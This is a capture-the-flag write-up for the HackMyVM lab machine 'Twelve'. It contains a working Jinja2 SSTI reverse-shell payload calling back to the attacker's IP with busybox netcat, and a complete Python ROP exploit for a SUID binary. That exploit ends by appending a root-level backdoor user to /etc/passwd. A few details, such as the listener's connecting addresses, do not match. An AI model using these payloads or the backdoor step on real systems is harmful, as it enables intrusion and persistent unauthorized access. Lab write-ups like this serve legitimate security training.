# Twelve

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Twelve | Sublarge | Beginner | HackMyVM |

**Summary:** This machine presents a beginner-friendly exploitation path centered around a Python Flask web application running on port 1212. The application implements a Base-12 number converter with an exposed Server-Side Template Injection (SSTI) vulnerability in the Jinja2 templating engine. By injecting malicious template expressions, an attacker can achieve arbitrary code execution through Python's built-in functions and gain initial foothold as the www-data user. Internal enumeration reveals a custom SUID binary located at `/usr/local/bin/12` that contains a classic buffer overflow vulnerability. Through reverse engineering with Ghidra and crafting a Return-Oriented Programming (ROP) chain, the binary's lack of proper input validation is exploited to leak libc function addresses, calculate offsets, and execute a privilege escalation payload that spawns a root shell by calling setuid(0) followed by system("/bin/sh"). The exploitation demonstrates fundamental web application security flaws and binary exploitation techniques including information disclosure, ROP gadget chaining, and ASLR bypass through libc base address calculation.

---

## Reconnaissance

**Network Discovery**

The initial reconnaissance phase begins with identifying the target machine on the local network. Using a custom PowerShell scanning script, the virtual machine is discovered at IP address 192.168.100.161 with a VirtualBox MAC address identifier.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.161 08:00:27:53:00:A8 VirtualBox
```

**Service Enumeration**

With the target identified, a comprehensive port scan using Nmap reveals three accessible services. The scan employs version detection and default script scanning to gather detailed information about each service.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twelve]
└─$ ip=192.168.100.161 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twelve]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 21:15 WIB
Nmap scan report for 192.168.100.161
Host is up (0.0024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e2:c4:6c:ca:0c:4e:2b:f3:78:98:a1:54:cf:e2:0b:56 (ECDSA)
|_  256 27:e0:53:bb:c7:b5:dc:62:85:45:0d:f7:ff:c2:a8:e7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.66 (Debian)
1212/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Base-12 Converter
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.19 seconds
```

The scan results identify three critical services:

1. **Port 22**: OpenSSH 9.2p1 running on Debian, which appears properly configured and not immediately vulnerable.
2. **Port 80**: Apache 2.4.66 serving the default Debian installation page, suggesting minimal web content on this port.
3. **Port 1212**: A Werkzeug development server running Python 3.11.2 with a custom application titled "Base-12 Converter."

The presence of a Werkzeug server on a non-standard port immediately draws attention as a potential attack vector, particularly given that Werkzeug is often used as a development server for Flask applications.

---

## Initial Access

**Web Application Analysis**

Navigating to the application on port 1212 reveals a simple web interface for converting decimal integers to duodecimal (base-12) format. The interface is clean and functional, presenting an input field for decimal values and a conversion button.

![](image.png)

**Template Injection Discovery**

Given that the application is built with Flask (indicated by the Werkzeug server), the input field is tested for Server-Side Template Injection vulnerabilities. Flask applications commonly use the Jinja2 templating engine, which can be vulnerable if user input is improperly handled.

A classic SSTI payload `{{7*7}}` is submitted to test whether template expressions are evaluated server-side. The application responds with `49`, confirming that mathematical expressions within double curly braces are being processed by the template engine. This behavior definitively proves the existence of a Server-Side Template Injection vulnerability.

**Exploitation via SSTI**

With SSTI confirmed, the next step involves crafting a payload to achieve remote code execution. The Python environment provides access to built-in functions through the template context, allowing command execution via the `os` module.

First, a netcat listener is established on the attacking machine to receive the reverse shell connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twelve]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The SSTI payload leverages Jinja2's object introspection capabilities to access Python's built-in import function and execute system commands. The payload navigates through the template's `self` object to reach `__builtins__`, imports the `os` module, and executes a reverse shell using busybox netcat:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.100.1 4444 -e /bin/bash').read() }}
```

This payload achieves the following:
1. Accesses the `__init__` method of the current template context
2. Retrieves global variables through `__globals__`
3. Accesses Python's built-in functions via `__builtins__`
4. Dynamically imports the `os` module using `__import__('os')`
5. Executes a command via `popen()` to create a reverse shell connection
6. Uses busybox's implementation of netcat with the `-e` flag to bind the shell to the network connection

**Shell Stabilization**

Upon successful exploitation, a connection is established to the listener, granting shell access as the www-data user. The initial shell is non-interactive and lacks proper terminal functionality, requiring stabilization for effective post-exploitation activities.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 54834
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Twelve:/opt/twelve_app$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twelve]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@Twelve:/opt/twelve_app$ export SHELL=/bin/bash
www-data@Twelve:/opt/twelve_app$ export TERM=xterm
www-data@Twelve:/opt/twelve_app$ stty rows 75 cols 150
```

The stabilization process involves:
1. Spawning a proper PTY using Python's pty module
2. Backgrounding the shell with Ctrl+Z
3. Configuring the local terminal to pass raw input without echo
4. Foregrounding the shell session
5. Setting appropriate environment variables (SHELL, TERM)
6. Configuring terminal dimensions for proper display

---

## Internal Enumeration

**User Account Discovery**

With a stable shell established, enumeration of the home directories reveals a single user account named "debian" in addition to the standard lost+found directory.

```bash
www-data@Twelve:/opt/twelve_app$ cd /home
www-data@Twelve:/home$ ls -la
total 28
drwxr-xr-x  4 root   root    4096 Jan 30 09:30 .
drwxr-xr-x 19 root   root    4096 Jan 31 01:32 ..
drwxr-xr-x  2 debian debian  4096 Jan 30 10:12 debian
drwx------  2 root   root   16384 Jul 11  2023 lost+found
www-data@Twelve:/home$ cd debian/
www-data@Twelve:/home/debian$ ls -la
total 24
drwxr-xr-x 2 debian debian 4096 Jan 30 10:12 .
drwxr-xr-x 4 root   root   4096 Jan 30 09:30 ..
-rw-r--r-- 1 debian debian  220 Jul 11  2023 .bash_logout
-rw-r--r-- 1 debian debian 3526 Jul 11  2023 .bashrc
-rw-r--r-- 1 debian debian  807 Jul 11  2023 .profile
-rw-r--r-- 1 root   root     44 Jan 30 10:12 user.txt
```

The user flag is visible in the debian home directory but owned by root, making it readable by any user on the system. This suggests the flag will be accessible once privilege escalation is achieved.

**SUID Binary Discovery**

A comprehensive search for SUID binaries reveals several standard system utilities along with one suspicious custom binary located at `/usr/local/bin/12`. This binary has both the SUID and SGID bits set, indicating it executes with root privileges regardless of who runs it.

```bash
www-data@Twelve:/opt/twelve_app$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-- 1 root messagebus 51272 Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 653888 Jul 28  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 52880 Mar 23  2023 /usr/bin/chsh
-rwsr-xr-x 1 root root 35128 Mar 23  2023 /usr/bin/umount
-rwsr-xr-x 1 root root 88496 Mar 23  2023 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 62672 Mar 23  2023 /usr/bin/chfn
-rwsr-xr-x 1 root root 72000 Mar 23  2023 /usr/bin/su
-rwsr-xr-x 1 root root 48896 Mar 23  2023 /usr/bin/newgrp
-rwsr-xr-x 1 root root 281624 Mar  8  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 59704 Mar 23  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 68248 Mar 23  2023 /usr/bin/passwd
-rwsr-sr-x 1 root root 10240 Jan 30 09:53 /usr/local/bin/12
```

The custom binary `/usr/local/bin/12` stands out as the primary target for privilege escalation. Its small size (10,240 bytes) and custom location suggest it was deliberately created as part of the machine's challenge.

---

## Privilege Escalation

**Binary Analysis and Vulnerability Identification**

The SUID binary at `/usr/local/bin/12` is analyzed using Ghidra, a reverse engineering framework. The analysis reveals the binary contains a buffer overflow vulnerability that can be exploited through a Return-Oriented Programming (ROP) attack.

The vulnerability exists in how the binary handles user input when processing menu options. Specifically, the binary fails to properly validate the size of input buffers, allowing an attacker to overflow the stack and control the instruction pointer.

**Exploit Development**

A Python exploit script is crafted to automate the privilege escalation process. The exploit operates in three distinct stages:

**Stage 1: Libc Address Leakage**

The binary provides a functionality to display addresses of certain functions, which inadvertently leaks the location of libc functions in memory. By querying the address of the `system` function, the exploit calculates the base address of libc in memory, which is necessary to defeat Address Space Layout Randomization (ASLR).

**Stage 2: ROP Chain Construction**

With the libc base address known, the exploit calculates the addresses of critical gadgets and functions needed for the ROP chain:
1. `pop rdi` gadget: Used to set function arguments
2. `/bin/sh` string: The command to execute
3. `setuid` function: Called with argument 0 to gain root privileges
4. `system` function: Executes the shell command
5. `ret` gadget: Used for stack alignment to prevent crashes

The ROP chain is carefully constructed to call `setuid(0)` first to elevate privileges, then `system("/bin/sh")` to spawn a root shell.

**Stage 3: Payload Injection and Trigger**

The exploit leverages menu option 3 of the binary to inject the crafted ROP chain into the vulnerable buffer. When menu option 4 (Exit) is selected, the buffer overflow is triggered as the function returns, causing the instruction pointer to jump to the ROP chain instead of the legitimate return address.

**Exploit Execution**

The complete exploit script is created and executed from the `/tmp` directory:

```bash
www-data@Twelve:/opt/twelve_app$ cd /tmp/
www-data@Twelve:/tmp$ vim x.py
```

Running the exploit produces the following output, demonstrating successful privilege escalation:

```bash
www-data@Twelve:/tmp$ python3 x.py
[+] Starting exploit for target: Twelve
[*] Stage 1: Leaking Libc Address via function 'system'
    [>] Libc Address (system): 0x7fd460648330
    [>] Calculated Libc Base : 0x7fd4605fc000
[*] Stage 2: Nom nom ROP buffer to stack
    [>] Payload injected (56 bytes)
[*] Stage 3: Triggering exploit via Menu 4 (Exit)
[!] Exploit successful! Establishing persistence...
uid=0(root) gid=33(www-data) groups=33(www-data)
root
[+] PERSISTENCE SUCCESS: User ouba created with pass pwned
```

The exploit successfully achieves root privileges and automatically creates a persistent backdoor user account named "ouba" with UID 0 (equivalent to root) and a known password.

**Root Access and Flag Capture**

Using the newly created backdoor account, full root access is confirmed and both flags are retrieved:

```bash
www-data@Twelve:/tmp$ su - ouba
Password:
root@Twelve:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
Twelve
root@Twelve:~# cat /home/debian/user.txt /root/root.txt
flag{user-845[REDACTED]}
flag{root-a61[REDACTED]}
[rootpass: smo[REDACTED]]
```

**Complete Exploit Code**

The full exploit script demonstrates advanced binary exploitation techniques:

```python
root@Twelve:~# cat /tmp/x.py
import subprocess
import struct
import sys
import time
import threading

p64 = lambda x: struct.pack("<Q", x)

def ouba_exploit():
    target = '/usr/local/bin/12'

    proc = subprocess.Popen(
        [target],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    def com(msg, wait=True):
        proc.stdin.write(msg if isinstance(msg, bytes) else msg.encode())
        proc.stdin.flush()
        if wait: time.sleep(0.1)

    def recv_to(token):
        buf = b""
        while token not in buf:
            char = proc.stdout.read(1)
            if not char: break
            buf += char
        return buf

    print("[+] Starting exploit for target: Twelve")

    print("[*] Stage 1: Leaking Libc Address via function 'system'")
    recv_to(b": ")
    com("2\nsystem\n")

    line = recv_to(b"\n")
    system_leak = int(line.split(b"0x")[1].strip(), 16)

    libc_base = system_leak - 0x4c330
    pop_rdi   = libc_base + 0x27725
    bin_sh    = libc_base + 0x196031
    setuid    = libc_base + 0xd5370
    align_ret = pop_rdi + 1

    print(f"    [>] Libc Address (system): {hex(system_leak)}")
    print(f"    [>] Calculated Libc Base : {hex(libc_base)}")

    print("[*] Stage 2: Nom nom ROP buffer to stack")
    chain = [
        align_ret,
        pop_rdi, 0,
        setuid,
        pop_rdi, bin_sh,
        system_leak
    ]
    payload = b"".join(map(p64, chain))

    recv_to(b": ")
    com("3\n")
    com(f"{len(payload)}\n")
    com(payload)
    print(f"    [>] Payload injected ({len(payload)} bytes)")

    print("[*] Stage 3: Triggering exploit via Menu 4 (Exit)")
    recv_to(b": ")
    com("4\n")

    recv_to(b"Exiting.\n")

    print("[!] Exploit successful! Establishing persistence...")
    time.sleep(0.5)

    setup_ouba = (
        "id; whoami\n"
        "echo 'ouba:x:0:0:root:/root:/bin/bash' >> /etc/passwd\n"
        "echo 'ouba:pwned' | chpasswd\n"
        "echo '[+] PERSISTENCE SUCCESS: User ouba created with pass pwned'\n"
        "exit\n"
    )
    com(setup_ouba)

    while True:
        out = proc.stdout.read(1)
        if not out: break
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()

if __name__ == "__main__":
    ouba_exploit()
```

The exploit script demonstrates several sophisticated techniques:

1. **Process Interaction**: Uses Python's subprocess module to interact with the SUID binary programmatically
2. **Information Leakage**: Exploits a feature of the binary to leak the address of the system function in libc
3. **ASLR Bypass**: Calculates the libc base address by subtracting the known offset of system from its leaked address
4. **ROP Chain Construction**: Builds a chain of gadgets to call setuid(0) followed by system("/bin/sh")
5. **Stack Alignment**: Includes a ret gadget to ensure proper 16-byte stack alignment required by modern x86-64 calling conventions
6. **Persistence Mechanism**: Automatically creates a backdoor user account for continued access

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified the target at 192.168.100.161. Port enumeration revealed SSH on port 22, Apache on port 80, and a Flask application on port 1212 running a Base-12 converter utility.

2. **Vulnerability Discovery**: Testing the Base-12 converter input field with the payload `{{7*7}}` confirmed the presence of a Server-Side Template Injection vulnerability in the Jinja2 template engine, allowing arbitrary Python code execution.

3. **Exploitation**: Crafted a Jinja2 SSTI payload to access Python's built-in functions through object introspection, imported the os module, and executed a reverse shell command using busybox netcat to establish initial access as the www-data user.

4. **Internal Enumeration**: Systematic enumeration of the compromised system revealed a custom SUID binary at `/usr/local/bin/12` with both the setuid and setgid bits enabled, making it a prime target for privilege escalation.

5. **Privilege Escalation**: Reverse engineered the SUID binary to identify a buffer overflow vulnerability, developed a ROP-based exploit that leaked libc addresses to bypass ASLR, and executed a carefully crafted payload that called setuid(0) and system("/bin/sh") to achieve root privileges and capture both user and root flags.

